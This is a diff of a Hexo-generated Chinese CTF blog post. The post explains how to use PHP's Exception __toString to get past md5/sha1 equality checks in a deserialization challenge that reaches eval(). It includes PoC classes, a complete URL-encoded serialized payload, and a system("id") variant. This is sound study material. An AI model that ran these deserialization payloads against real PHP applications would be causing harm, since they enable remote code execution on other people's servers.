@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -291,16 +291,16 @@
 
 highlight_file(__FILE__);
 
-class Timeline &#123;
+class Timeline {
     public $var3;
-    function __destruct()&#123;
+    function __destruct(){
         var_dump(md5($this-&gt;var1));
         var_dump(md5($this-&gt;var2));
-     👉 if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) )&#123;
+     👉 if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ){
             eval($this-&gt;var1);
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 
 unserialize($_GET[1]);
 
@@ -321,24 +321,24 @@ foreach ($classes as $class)
 <h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>先展示一个直观的PoC代码，再对其进行分析</p>
 <pre><code class="php">&lt;?php
 
-class Exceptiop&#123;
+class Exceptiop{
     protected  $message ;
     protected  $file ;
-    public function __construct($mess, $file)&#123;
+    public function __construct($mess, $file){
         $this-&gt;message = $mess;
         $this-&gt;file = $file;
-    &#125;
-&#125;
+    }
+}
 
-class Timeline &#123;
+class Timeline {
     public $var3;
-    function __construct()&#123;
+    function __construct(){
         $evalcode = &quot;echo 1; __HALT_COMPILER();&quot;;
         $this-&gt;var1 = new Exceptiop($evalcode,&quot;in &quot;);
         $this-&gt;var2 = new Exceptiop($evalcode.&quot; in&quot;,&quot;&quot;);
 
-    &#125;
-    function __destruct()&#123;
+    }
+    function __destruct(){
         var_dump(md5($this-&gt;var1));
         var_dump(md5($this-&gt;var2));
         echo &quot;&lt;hr&gt;&quot;;
@@ -347,11 +347,11 @@ class Timeline &#123;
         echo &quot;&lt;hr&gt;&quot;;
         echo $this-&gt;var1. &quot;&lt;br&gt;&quot;;
         echo $this-&gt;var2;
-        if( ($this-&gt;var1 !== $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) )&#123;
+        if( ($this-&gt;var1 !== $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ){
             eval($this-&gt;var1);
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 
 $t = new Timeline();
 $t1 = str_replace(&quot;Exceptiop&quot;,&quot;Exception&quot;,serialize($t));
@@ -370,26 +370,26 @@ echo urlencode($t1);
 <pre><code class="php">Exception: echo 1; __HALT_COMPILER(); in in :37 👈 Exception: $mess in $file :$line
 Stack trace:
 #0 /Library/WebServer/Documents/CTFSkill/PHP/exp.php(37): unserialize(&#39;O:8:&quot;Timeline&quot;:...&#39;)
-#1 &#123;main&#125;</code></pre>
+#1 {main}</code></pre>
 <p>这就刚好解释了为什么必须要控制<code>$file</code>，切忌都写成<code>($evalcode,&quot;in &quot;)</code>或<code>($evalcode.&quot; in&quot;,&quot;&quot;)</code>，这样<code>var1</code>和<code>var2</code>就都相等了</p>
 <p>在<code>$evalcode</code>中必须要用到<code>__HALT_COMPILER();</code>，其作用是<strong>让编译器执行到这之后就不再去解析后面的部分</strong>；如果不使用的话，在之后<code>eval()</code>中就会发生<code>Parse error</code></p>
 <p>![截屏2020-08-14 上午10.12.52](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.12.52.png)</p>
 <p>之后将PoC生产的POP链赋值给参数1即可</p>
-<pre><code>?1=O%3A8%3A&quot;Timeline&quot;%3A3%3A&#123;s%3A4%3A&quot;var3&quot;%3BN%3Bs%3A4%3A&quot;var1&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A&#123;s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A26%3A&quot;echo+1%3B+__HALT_COMPILER()%3B&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A3%3A&quot;in+&quot;%3B&#125;s%3A4%3A&quot;var2&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A&#123;s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A29%3A&quot;echo+1%3B+__HALT_COMPILER()%3B+in&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A0%3A&quot;&quot;%3B&#125;&#125;</code></pre>
+<pre><code>?1=O%3A8%3A&quot;Timeline&quot;%3A3%3A{s%3A4%3A&quot;var3&quot;%3BN%3Bs%3A4%3A&quot;var1&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A{s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A26%3A&quot;echo+1%3B+__HALT_COMPILER()%3B&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A3%3A&quot;in+&quot;%3B}s%3A4%3A&quot;var2&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A{s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A29%3A&quot;echo+1%3B+__HALT_COMPILER()%3B+in&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A0%3A&quot;&quot;%3B}}</code></pre>
 <p>![截屏2020-08-14 上午10.15.37](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.15.37.png)</p>
 <h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>这个方法比第一种灵活，构造PoC</p>
 <pre><code class="php">&lt;?php
 
-class Timeline &#123;
+class Timeline {
     public $var3;
-    function __destruct()&#123;
+    function __destruct(){
         var_dump(md5($this-&gt;var1));
         var_dump(md5($this-&gt;var2));
-        if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) )&#123;
+        if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) ){
             eval($this-&gt;var1);
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 
 $ex1 = new Exception(&#39;system(&quot;id&quot;);?&gt;&#39;);$ex2 = new Exception(&#39;system(&quot;id&quot;);?&gt;&#39;,1); 👈 同一行，不然Exception中的行号不一样
 $wtf = new Timeline();
